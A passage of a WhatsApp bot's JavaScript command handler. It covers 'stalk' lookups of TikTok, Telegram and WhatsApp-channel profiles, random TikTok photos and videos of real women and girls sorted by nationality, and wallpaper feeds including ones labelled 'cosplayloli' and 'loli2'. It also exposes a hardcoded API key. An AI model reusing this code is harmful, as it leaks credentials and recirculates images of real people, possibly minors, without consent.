┌──「 *TIKTOK STALK* 」
▢ *🔖 Name:* ${user.nickname}
▢ *🔖 Username:* ${user.username}
▢ *👥 Followers:* ${user.followerCount}
▢ *🫂 Following:* ${user.followingCount}
▢ *💖 Hearts:* ${user.heartCount}
▢ *📌 Description:* ${user.signature || 'No description available.'}
▢ *🔗 Link:* https://tiktok.com/${user.username}
└────────────`;

    // Send the message with user profile image
    await XliconBotInc.sendMessage(m.chat, { image: { url: user.avatarLarger }, caption: txt }, { quoted: m });

  } catch (error) {
    console.error('Error fetching TikTok user data:', error.message);
    await XliconBotInc.sendMessage(m.chat, { text: '❌ An error occurred while processing the request. Please try again later.' }, { quoted: m });
  }
}
break;

case 'telestalk': {
  if (!text) return replygcxlicon(`*Where is the Telegram Username?*\n_Example:_\n${prefix}${command} ahmmikun`);

  try {
    // Fetch Telegram user data using the provided API
    const apiUrl = `${global.api}stalking/telegram-user?apikey=${global.id}&user=${encodeURIComponent(text)}`;
    let api = await fetchJson(apiUrl);

    // Log the API response for debugging
    console.log('Telegram API Response:', api);

    if (!api || api.status !== 200 || !api.result) {
      console.error('API response is invalid or no results found:', api);
      await XliconBotInc.sendMessage(m.chat, '❌ No results found on Telegram. Please try again with a different username.', { quoted: m });
      return;
    }

    // Prepare the response message with user information
    const userInfo = `*📱 T E L E G R A M - U S E R 📱*\n\n` +
                     `• 👤 *Name*: ${api.result.name}\n` +
                     `• 🆔 *Username*: ${api.result.username}\n` +
                     `• 📜 *Bio*: ${api.result.bio}\n` +
                     `• 🔗 *Profile Photo*: ${api.result.photo}`;

    // Send the user info to the user
    await XliconBotInc.sendMessage(m.chat, { text: userInfo }, { quoted: m });

    // Send the Telegram user's profile photo
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: api.result.photo },
      caption: `*Profile Photo of ${api.result.name}*`
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching Telegram data:', error.message);
    await XliconBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the Telegram data. Please try again later.' }, { quoted: m });
  }
}
break;


case 'wachannelstalk': {
  if (!text) return replygcxlicon(`*Where is the WhatsApp Channel URL?*\n_Example:_\n${prefix}${command} httpshttps://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y`);

  try {
    // Fetch WhatsApp channel data using the provided API
    const apiUrl = `${global.api}stalking/whatsapp-channel?apikey=${global.id}&url=${encodeURIComponent(text)}`;
    let api = await fetchJson(apiUrl);

    // Log the API response for debugging
    console.log('WhatsApp Channel API Response:', api);

    if (!api || api.status !== 200 || !api.result) {
      console.error('API response is invalid or no results found:', api);
      await XliconBotInc.sendMessage(m.chat, '❌ No results found on WhatsApp Channel. Please try again with a different URL.', { quoted: m });
      return;
    }

    // Prepare the response message with channel information
    const channelInfo = `*🌐 W H A T S A P P - C H A N N E L 🌐*\n\n` +
                        `• 🏷️ *Title*: ${api.result.title}\n` +
                        `• 📜 *Description*: ${api.result.description}\n` +
                        `• 👥 *Followers*: ${api.result.followers}\n` +
                        `• 🔗 *Channel Link*: ${text}`;

    // Send the channel info to the user
    await XliconBotInc.sendMessage(m.chat, { text: channelInfo }, { quoted: m });

    // Send the WhatsApp channel's image
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: api.result.img },
      caption: `*Channel Image for ${api.result.title}*`
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching WhatsApp channel data:', error.message);
    await XliconBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the WhatsApp channel data. Please try again later.' }, { quoted: m });
  }
}
break;



			case 'tiktokgirl': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        // Load the list of TikTok videos from the JSON file
        var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'));
        
        // Select a random TikTok video from the list
        var hasil = pickRandom(asupan);

        // Send the video directly with a caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        // Handle errors gracefully and send a message to the user
        console.error('Error in tiktokgirl command:', error.message);  // Log specific error message
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;

case 'tiktokghea': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'));
        var hasil = pickRandom(gheayubi);

        // Prepare and send the video with caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        console.error('Error in tiktokghea command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;

case 'tiktokbocil': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'));
        var hasil = pickRandom(bocil);

        // Prepare and send the video with caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        console.error('Error in tiktokbocil command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;

case 'tiktoknukhty': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'));
        var hasil = pickRandom(ukhty);

        // Prepare and send the video with caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        console.error('Error in tiktoknukhty command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;

case 'tiktoksantuy': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'));
        var hasil = pickRandom(santuy);

        // Prepare and send the video with caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        console.error('Error in tiktoksantuy command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;

case 'tiktokkayes': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'));
        var hasil = pickRandom(kayes);

        // Prepare and send the video with caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        console.error('Error in tiktokkayes command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;

case 'tiktokpanrika': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'));
        var hasil = pickRandom(rikagusriani);

        // Prepare and send the video with caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        console.error('Error in tiktokpanrika command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;

case 'tiktoknotnot': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the video with caption
        const caption = `👋 Hi ${m.pushName}\n_*Here is the result of: ${command}*_ 🎉`;


        await XliconBotInc.sendMessage(m.chat, {
            video: { url: hasil.url },
            caption: caption,
            mimetype: 'video/mp4', // Specify the MIME type
        }, { quoted: m });

    } catch (error) {
        console.error('Error in tiktoknotnot command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok video. Please try again later.');
    }
}
break;
        
        
case 'chinese': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🎉 Enjoy the Chinese TikTok pic! 🇨🇳`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in chinese command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'hijab': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n💖 Enjoy the beautiful hijab TikTok pic! 🧕`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in hijab command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'japanese': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🎏 Enjoy the Japanese TikTok pic! 🇯🇵`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in japanese command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'korean': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🇰🇷 Enjoy the Korean TikTok pic! 🎶`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in korean command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'malay': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🇲🇾 Enjoy the Malay TikTok pic! 🌸`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in malay command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'randomgirl': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🌟 Enjoy this random TikTok girl pic! 💖`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in randomgirl command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'randomboy': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🌟 Enjoy this random TikTok boy pic! 💙`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in randomboy command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'thai': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🇹🇭 Enjoy the Thai TikTok pic! 🍀`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in thai command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'vietnamese': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🇻🇳 Enjoy the Vietnamese TikTok pic! 🎋`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in vietnamese command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'indo': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'));
        var hasil = pickRandom(notnot);

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_\n🇮🇩 Enjoy the Indonesian TikTok pic! 🌸`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: hasil.url },  // Send image instead of video
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in indo command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the TikTok image. Please try again later. 😓');
    }
}
break;

case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
XliconBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break

//------------------------------------------------------------------------------------------------//
case 'anime': {
    // Get the anime name from the user's input
    let queryText = args.join(' ');

    // Check if queryText is provided
    if (!queryText) {
        return await XliconBotInc.sendText(m.chat, "⚠️ Please provide the name of the anime.");
    }

    // Check if the query includes '-tr' for translation
    const translateFlag = queryText.endsWith('-tr');
    if (translateFlag) {
        queryText = queryText.slice(0, -4).trim(); // Remove the '-tr' from the query
    }

    // Define the API URL with the user's query
    const apiUrl = `https://api.lolhuman.xyz/api/anime?apikey=dcb4198762eb793a386a9c1c&query=${encodeURIComponent(queryText)}`;

    try {
        // Fetch data from the API
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (data.status !== 200 || !data.result || data.result.length === 0) {
            return await XliconBotInc.sendText(m.chat, "❌ Failed to fetch anime details. Please check the query and try again.");
        }

        const anime = data.result;

        // Extract relevant data with safety checks
        const title = anime.title?.english || anime.title?.romaji || anime.title?.native || 'Unknown Title';
        const description = anime.description || 'No description available.';
        const genres = anime.genres?.join(', ') || 'Unknown';
        const status = anime.status || 'Unknown';
        const episodes = anime.episodes || 'Unknown';
        const duration = anime.duration || 'Unknown';
        const startDate = anime.startDate ? `${anime.startDate.year}-${anime.startDate.month}-${anime.startDate.day}` : 'N/A';
        const endDate = anime.endDate ? `${anime.endDate.year}-${anime.endDate.month}-${anime.endDate.day}` : 'N/A';

        // Delay function to throttle requests
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Translate function with retry logic
        async function translateText(text, targetLang) {
            let retries = 5;
            while (retries > 0) {
                try {
                    await delay(500); // Delay between requests
                    let result = await translate(text, { to: targetLang });
                    return result.text;
                } catch (error) {
                    console.error('Translation error:', error);
                    if (error.message.includes('TooManyRequestsError')) {
                        await delay(10000); // Wait for 10 seconds before retrying
                    } else {
                        return text; // Return original text if translation fails
                    }
                    retries -= 1;
                }
            }
            return text; // Return original text if all retries fail
        }

        // Translate description if needed
        let translatedDescription = description;
        if (translateFlag) {
            translatedDescription = await translateText(description, 'ur');
        }

        // Create the caption with translations and emojis
        const captionText = `*🌟 Title:* ${title}

✨ *Genres:* ${genres}
✨ *Status:* ${status}
✨ *Episodes:* ${episodes}
✨ *Duration:* ${duration} minutes per episode
✨ *Start Date:* ${startDate}
✨ *End Date:* ${endDate}

📝 *Description:* ${translatedDescription}
`.trim();

        // Use the anime cover image URL directly
        const imageUrl = anime.coverImage?.large || 'https://via.placeholder.com/500';

        // Send the message with the image URL and the caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: captionText,  // caption text with translated description (if applicable)
            mentions: [m.sender]   // Mention the sender
        });

    } catch (error) {
        console.error('API Fetch Error:', error);
        return await XliconBotInc.sendText(m.chat, "❌ An error occurred while fetching the anime details.");
    }
}
break;


//------------------------------------------------------------------------------------------------//

case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko': {
    await XliconStickWait();  // Indicate that the bot is processing the request

    try {
        let heyy;
        if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
